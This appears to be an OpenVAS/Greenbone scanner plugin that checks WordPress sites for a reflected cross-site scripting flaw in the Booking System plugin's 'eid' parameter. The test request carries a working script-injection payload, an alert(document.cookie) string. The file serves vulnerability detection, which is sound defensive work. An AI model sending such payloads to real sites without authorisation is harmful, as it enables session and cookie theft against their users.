CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
HTML and script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress Booking System Plugin" );
	script_tag( name: "insight", value: "The flaw is caused due to an input validation error in the 'eid'
parameter in '/wp-content/plugins/booking-system/events_facualty_list.php'
script when processing user-supplied data." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running WordPress Booking System plugin and is prone
to cross site scripting vulnerability." );
	script_oid( "1.3.6.1.4.1.25623.1.0.803696" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2013-07-08 16:10:14 +0530 (Mon, 08 Jul 2013)" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "WordPress Booking System Plugin XSS Vulnerability" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/wordpress-booking-system-cross-site-scripting" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/122289/WordPress-Booking-System-Cross-Site-Scripting.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/booking-system/events_facualty_list.php?" + "eid=\"><script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "><script>alert\\(document\\.cookie\\)</script>" )){
	security_message( port: port );
	exit( 0 );
}

